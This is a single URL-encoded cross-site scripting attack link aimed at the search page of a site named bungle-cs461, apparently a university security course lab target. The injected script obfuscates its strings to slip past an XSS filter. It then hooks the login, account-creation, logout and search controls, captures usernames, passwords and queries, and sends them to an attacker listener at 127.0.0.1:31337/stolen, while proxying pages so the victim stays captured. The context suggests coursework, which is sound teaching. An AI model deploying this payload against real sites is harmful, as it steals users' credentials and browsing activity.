http://bungle-cs461.csl.illinois.edu/./search?xssdefense=4&q=%3Cscript%3Efunction%20payload()%20%7B%0A%09%09%09%2F%2F%20Make%20Strings%0A%09%09%09var%20header%20%3D%20String(%2Fhttp%3A%2F)%3B%0A%09%09%09header%20%3D%20header.substring(1%2C%20header.length)%3B%0A%09%09%09%0A%09%09%09var%20attacker%20%3D%20String(%2F127.0.0.1%3A31337%2F)%3B%0A%09%09%09attacker%20%3D%20attacker.substring(0%2C%20attacker.length)%3B%0A%09%09%09attacker%20%3D%20header.concat(attacker)%3B%0A%09%09%09var%20stolen%20%3D%20String(%2Fstolen%2F)%3B%0A%09%09%09stolen%20%3D%20stolen.substring(1%2C%20stolen.length-1)%3B%0A%09%09%09attacker%20%3D%20attacker.concat(stolen)%3B%0A%09%09%09%0A%09%09%09var%20target%20%3D%20String(%2Fbungle-cs461.csl.illinois.edu%2F)%3B%0A%09%09%09target%20%3D%20target.substring(0%2C%20target.length)%3B%0A%09%09%09target%20%3D%20header.concat(target)%3B%0A%09%09%09%0A%09%09%09var%20login%20%3D%20String(%2Flogin%2F)%3B%0A%09%09%09login%20%3D%20login.substring(1%2C%20login.length-1)%3B%0A%09%09%09%0A%09%09%09var%20logout%20%3D%20String(%2Flogout%2F)%3B%0A%09%09%09logout%20%3D%20logout.substring(1%2C%20logout.length-1)%3B%0A%09%09%09%0A%09%09%09var%20ssearch%20%3D%20String(%2Fsearch%2F)%3B%0A%09%09%09ssearch%20%3D%20ssearch.substring(1%2C%20ssearch.length-1)%3B%0A%09%09%09%0A%09%09%09var%20create%20%3D%20String(%2Fcreate%2F)%3B%0A%09%09%09create%20%3D%20create.substring(1%2C%20create.length-1)%3B%0A%09%09%09%0A%09%09%09var%20searchAg%20%3D%20String(%2Fsearch%20again%2F)%3B%0A%09%09%09searchAg%20%3D%20searchAg.substring(1%2C%20searchAg.length-1)%3B%0A%09%09%09%0A%09%09%09var%20username%20%3D%20String(%2Fusername%2F)%3B%0A%09%09%09username%20%3D%20username.substring(1%2C%20username.length-1)%3B%0A%09%09%09%0A%09%09%09var%20userpass%20%3D%20String(%2Fuserpass%2F)%3B%0A%09%09%09userpass%20%3D%20userpass.substring(1%2C%20userpass.length-1)%3B%0A%09%09%09%0A%09%09%09var%20password%20%3D%20String(%2Fpassword%2F)%3B%0A%09%09%09password%20%3D%20password.substring(1%2C%20password.length-1)%3B%0A%09%09%09%0A%09%09%09var%20loginBtn%20%3D%20String(%2Flog-in-btn%2F)%3B%0A%09%09%09loginBtn%20%3D%20loginBtn.substring(1%2C%20loginBtn.length-1)%3B%0A%09%09%09%0A%09%09%09var%20createBtn%20%3D%20String(%2Fnew-account-btn%2F)%3B%0A%09%09%09createBtn%20%3D%20createBtn.substring(1%2C%20createBtn.length-1)%3B%0A%09%09%09%0A%09%09%09var%20logoutBtn%20%3D%20String(%2Flog-out-btn%2F)%3B%0A%09%09%09logoutBtn%20%3D%20logoutBtn.substring(1%2C%20logoutBtn.length-1)%3B%0A%09%09%09%0A%09%09%09var%20searchBtn%20%3D%20String(%2Fsearch-btn%2F)%3B%0A%09%09%09searchBtn%20%3D%20searchBtn.substring(1%2C%20searchBtn.length-1)%3B%0A%09%09%09%0A%09%09%09var%20searchAgBtn%20%3D%20String(%2Fsearch-again-btn%2F)%3B%0A%09%09%09searchAgBtn%20%3D%20searchAgBtn.substring(1%2C%20searchAgBtn.length-1)%3B%0A%09%09%09%0A%09%09%09var%20bungleBtn%20%3D%20String(%2Fbungle-lnk%2F)%3B%0A%09%09%09bungleBtn%20%3D%20bungleBtn.substring(1%2C%20bungleBtn.length-1)%3B%0A%09%09%09%0A%09%09%09var%20queryId%20%3D%20String(%2Fquery%2F)%3B%0A%09%09%09queryId%20%3D%20queryId.substring(1%2C%20queryId.length-1)%3B%0A%09%09%09%0A%09%09%09var%20bungle%20%3D%20String(%2Fbungle%2F)%3B%0A%09%09%09bungle%20%3D%20bungle.substring(1%2C%20bungle.length-1)%3B%0A%09%09%09%0A%09%09%09var%20post%20%3D%20String(%2FPOST%2F)%3B%0A%09%09%09post%20%3D%20post.substring(1%2C%20post.length-1)%3B%0A%09%09%09%0A%09%09%09var%20shtml%20%3D%20String(%2Fhtml%2F)%3B%0A%09%09%09shtml%20%3D%20shtml.substring(1%2C%20shtml.length-1)%3B%0A%09%09%09%0A%09%09%09var%20loggedInUser%20%3D%20String(%2Flogged-in-user%2F)%3B%0A%09%09%09loggedInUser%20%3D%20loggedInUser.substring(1%2C%20loggedInUser.length-1)%3B%0A%09%09%09%0A%09%09%09var%20popState%20%3D%20String(%2Fpopstate%2F)%3B%0A%09%09%09popState%20%3D%20popState.substring(1%2C%20popState.length-1)%3B%0A%09%09%09%0A%09%09%09var%20nav%20%3D%20String(%2Fnav%2F)%3B%0A%09%09%09nav%20%3D%20nav.substring(1%2C%20nav.length-1)%3B%0A%09%09%09%0A%09%09%09var%20loginURL%20%3D%20String(%2Flogin%3Fxssdefense%3D4%2F)%3B%0A%09%09%09loginURL%20%3D%20loginURL.substring(1%2C%20loginURL.length-1)%3B%0A%09%09%09loginURL%20%3D%20target.concat(loginURL)%3B%0A%09%09%09%0A%09%09%09var%20logoutURL%20%3D%20String(%2Flogout%3Fxssdefense%3D4%2F)%3B%0A%09%09%09logoutURL%20%3D%20logoutURL.substring(1%2C%20logoutURL.length-1)%3B%0A%09%09%09logoutURL%20%3D%20target.concat(logoutURL)%3B%0A%09%09%09%0A%09%09%09var%20createURL%20%3D%20String(%2Fcreate%3Fxssdefense%3D4%2F)%3B%0A%09%09%09createURL%20%3D%20createURL.substring(1%2C%20createURL.length-1)%3B%0A%09%09%09createURL%20%3D%20target.concat(createURL)%3B%0A%09%09%09%0A%09%09%09var%20searchURL%20%3D%20String(%2Fsearch%3Fxssdefense%3D4%26q%3D%2F)%3B%0A%09%09%09searchURL%20%3D%20searchURL.substring(1%2C%20searchURL.length-1)%3B%0A%09%09%09searchURL%20%3D%20target.concat(searchURL)%3B%0A%09%09%09%2F%2F%0A%09%09%09%0A%09%09%09function%20log(data)%20%7B%0A%09%09%09%09console.log(%24.param(data))%3B%0A%09%09%09%09%24.get(attacker%2C%20data)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20logInListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20login%3B%0A%09%09%09%09var%20user%20%3D%20document.getElementById(username).value%3B%0A%09%09%09%09message.user%20%3D%20user%3B%0A%09%09%09%09var%20pass%20%3D%20document.getElementById(userpass).value%3B%0A%09%09%09%09message.pass%20%3D%20pass%3B%0A%09%09%09%09log(message)%3B%0A%09%09%09%09%0A%09%09%09%09%24.ajax(%7B%0A%09%09%09%09%09type%3A%20post%2C%0A%09%09%09%09%09data%3A%20%7Busername%3A%20user%2C%20password%3A%20pass%7D%2C%0A%09%09%09%09%09url%3A%20loginURL%0A%09%09%09%09%7D).done(function%20(data)%20%7B%0A%09%09%09%09%09proxy(target)%3B%0A%09%09%09%09%09window.history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20createListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20create%3B%0A%09%09%09%09var%20user%20%3D%20document.getElementById(username).value%3B%0A%09%09%09%09message.user%20%3D%20user%3B%0A%09%09%09%09var%20pass%20%3D%20document.getElementById(userpass).value%3B%0A%09%09%09%09message.pass%20%3D%20pass%3B%0A%09%09%09%09log(message)%3B%0A%09%09%09%09%0A%09%09%09%09%24.ajax(%7B%0A%09%09%09%09%09type%3A%20post%2C%0A%09%09%09%09%09data%3A%20%7Busername%3A%20user%2C%20password%3A%20pass%7D%2C%0A%09%09%09%09%09url%3A%20createURL%0A%09%09%09%09%7D).done(function%20(data)%20%7B%0A%09%09%09%09%09proxy(target)%3B%0A%09%09%09%09%09window.history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20logOutListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20logout%3B%0A%09%09%09%09message.user%20%3D%20document.getElementById(loggedInUser).innerHTML%3B%0A%09%09%09%09log(message)%3B%0A%09%09%09%09%0A%09%09%09%09%24.ajax(%7B%0A%09%09%09%09%09type%3A%20post%2C%0A%09%09%09%09%09url%3A%20logoutURL%0A%09%09%09%09%7D).done(function%20(data)%20%7B%0A%09%09%09%09%09proxy(target)%3B%0A%09%09%09%09%09window.history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20searchListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20ssearch%3B%0A%09%09%09%09if%20(document.getElementById(loggedInUser))%0A%09%09%09%09%09message.user%20%3D%20document.getElementById(loggedInUser).innerHTML%3B%0A%09%09%09%09var%20query%20%3D%20document.getElementById(queryId).value%3B%0A%09%09%09%09message.query%20%3D%20query%3B%0A%09%09%09%09log(message)%3B%0A%09%09%09%09%0A%09%09%09%09var%20url%20%3D%20searchURL%3B%0A%09%09%09%09url%20%3D%20url.concat(query)%3B%0A%09%09%09%09proxy(url)%3B%0A%09%09%09%09window.history.pushState(null%2C%20null%2C%20target.concat(url))%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20searchAgListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20searchAg%3B%0A%09%09%09%09if%20(document.getElementById(loggedInUser))%0A%09%09%09%09%09message.user%20%3D%20document.getElementById(loggedInUser).innerHTML%3B%0A%09%09%09%09log(message)%3B%0A%09%09%09%09%0A%09%09%09%09proxy(target)%3B%0A%09%09%09%09window.history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20bungleListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20bungle%3B%0A%09%09%09%09if%20(document.getElementById(loggedInUser))%0A%09%09%09%09%09message.user%20%3D%20document.getElementById(loggedInUser).innerHTML%3B%0A%09%09%09%09log(message)%3B%0A%09%09%09%09%0A%09%09%09%09proxy(target)%3B%0A%09%09%09%09window.history.pushState(null%2C%20null%2C%20target)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20proxy(href)%20%7B%0A%09%09%09%09%24(shtml).load(href%2C%20function(res)%20%7B%0A%09%09%09%09%09%24(shtml).show()%3B%0A%09%09%09%09%09if%20(document.getElementById(loggedInUser))%20%7B%0A%09%09%09%09%09%09var%20user%20%3D%20document.getElementById(loggedInUser).innerHTML%3B%0A%09%09%09%09%09%09log(%7Bevent%3A%20nav%2C%20user%3A%20user%2C%20url%3A%20href%7D)%3B%0A%09%09%09%09%09%7D%20else%20%7B%0A%09%09%09%09%09%09log(%7Bevent%3A%20nav%2C%20url%3A%20href%7D)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%2F%2F%20Listeners%0A%09%09%09%09%09if%20(document.getElementById(loginBtn))%20%7B%0A%09%09%09%09%09%09document.getElementById(loginBtn).onclick%20%3D%20logInListener%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%0A%09%09%09%09%09if%20(document.getElementById(createBtn))%20%7B%0A%09%09%09%09%09%09document.getElementById(createBtn).onclick%20%3D%20createListener%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%0A%09%09%09%09%09if%20(document.getElementById(logoutBtn))%20%7B%0A%09%09%09%09%09%09document.getElementById(logoutBtn).onclick%20%3D%20logOutListener%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%0A%09%09%09%09%09if%20(document.getElementById(searchBtn))%20%7B%0A%09%09%09%09%09%09document.getElementById(searchBtn).onclick%20%3D%20searchListener%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%0A%09%09%09%09%09if%20(document.getElementById(searchAgBtn))%20%7B%0A%09%09%09%09%09%09document.getElementById(searchAgBtn).onclick%20%3D%20searchAgListener%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%0A%09%09%09%09%09if%20(document.getElementById(bungleBtn))%20%7B%0A%09%09%09%09%09%09document.getElementById(bungleBtn).onclick%20%3D%20bungleListener%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%0A%09%09%09%09%09window.addEventListener(popState%2C%20function(event)%20%7B%0A%09%09%09%09%09%09proxy(window.location.href)%3B%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%24(shtml).hide()%3B%0A%09%09%09proxy(target)%3B%0A%09%09%09window.history.replaceState(null%2C%20null%2C%20target)%3B%0A%09%09%7D%3Bpayload()%3B%3C%2Fscript%3E
